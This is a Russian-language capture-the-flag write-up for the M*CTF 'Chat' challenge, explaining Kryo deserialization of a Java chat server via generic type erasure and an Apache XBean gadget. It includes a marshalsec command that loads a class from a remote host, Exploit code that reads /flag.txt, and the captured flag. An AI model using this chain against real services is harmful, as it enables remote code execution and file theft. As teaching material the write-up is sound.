# Chat

## Описание
Мы создали Официальный Чат M*CTF ©, в котором все цтферы могут делиться опытом. Прочитайте флаг из /flag.txt и отправьте нам, чтобы получить золотой цветочек возле имени пользователя.

Чтобы упростить задачу, вот список зависимостей с сервера:
```
dependencies {
    implementation 'org.springframework.boot:spring-boot-starter-websocket'
    compile group: 'com.esotericsoftware', name: 'kryo', version: '4.0.2'
    compile group: 'org.apache.xbean', name: 'xbean-naming', version: '4.17'
    compileOnly 'org.projectlombok:lombok'
    annotationProcessor 'org.projectlombok:lombok'
}
```

## Краткое описание уязвимости
Таск представляет собой клиент-серверный чат на java.
Сообщения передаются в виде объектов, сериализованных в формате kryo. 

Объект сериализуется с помощью writeObject, а не writeClassAndObject, поэтому можно передать не любой объект, а только ChatMessage.
 
Но из-за [стирания дженериков в рантайме](https://javarush.ru/groups/posts/2315-stiranie-tipov) в List внутри сообщения можно положить любой класс. 
В качестве гаджета используется Apache XBean (чтобы не перебирать все варианты, в описании таска был дан кусок build.gradle сервера), 
с помощью которого можно добиться загрузки класса из удаленного источника. При инициализации этого класса будет выполнен static блок, что даст атакующему RCE.

# Решение
## Исследование клиента
Дан клиент чата в формате jar приложения. При декомпиляции мы можем прочитать код и увидеть, что при отправке сообщения 
клиент создает List<ChatMessageComponent>, кладет его в ChatMessage, сериализует с помощью `Kryo#writeObject` и отправляет 
в вебсокет на `ws://chat.mctf.online`. При получении сообщений или ошибок они выводились на экран и в консоль.

## Сериализация

Многие уязвимости на сериализацию основаны на том, что отправить можно любой объект, а не только тот, который ожидает сервер. 
Но в данном случае используется `writeObject`, а не `writeClassAndObject`. Соответственно, 
на стороне сервера используется `readObject(..., ChatMessage.class)`, который не сможет прочитать другой класс.

На этом моменте нужно вспомнить про [стирание дженериков в java](https://javarush.ru/groups/posts/2315-stiranie-tipov). 
Мы можем передать любой класс в `List<ChatMessageComponent>`, если превратим его в `List<Object>`. Даже если сервер захочет 
получить компонент из списка и выбросит ошибку, до этого ему придется десериализовать этот класс.

## Подготовка эксплоита

Если загуглить `kryo deserialization vulnerability`, можно попасть на страницу 
[Java Deserialization Cheat Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet), где собрана подборка 
уязвимостей в библиотеках для сериализации в Java. Там в разделе `Payload generators` можно найти ссылку на 
[marshalsec](https://github.com/mbechler/marshalsec), который может сгенерировать payload за нас.

Единственная проблема - marshalsec выдает классы, которые должны приниматься `readClassAndObject`, а нам надо засунуть 
его в `ChatMessage#messages`. Для этого придется немного переписать marshalsec. Патч приведен в папке exploit.

Нам нужен эксплоит на XBean, а он есть только в классе KryoAltStrategy. Эксплоит работает таким образом: при десериализации класса 
он попытается создать ObjectFactory, которая находится в удаленном codebase. Если получится не ObjectFactory, то мы получим ошибку, 
но перед этим выполнится static блок, в который можно закинуть чтение файла и выброс исключения. Можно передать флаг и другими способами, 
например, открыть шелл.

Сгенерируем эксплоит:
```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.KryoAltStrategy XBean http://serega6531.ru:8080/exploit.jar Exploit > exploit.kryo
```
Пример готового эксплоита лежит в папке exploit.
Код Exploit, который лежит в exploit.jar:
```
public class Exploit
{
    static {
        try {
            throw new RuntimeException(Files.readString(new File("/flag.txt").toPath()));
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

После генерации эксплоита и открытия сервера на нужном порту (`python -m http.server 8080`), можно отправлять его и 
получать флаг в ответе. В exploit/ лежит модифицированный клиент для этих целей.

```
java.lang.RuntimeException: mctf{you_became_the_king_of_chat}
	at Exploit.<clinit>(Exploit.java:10)
```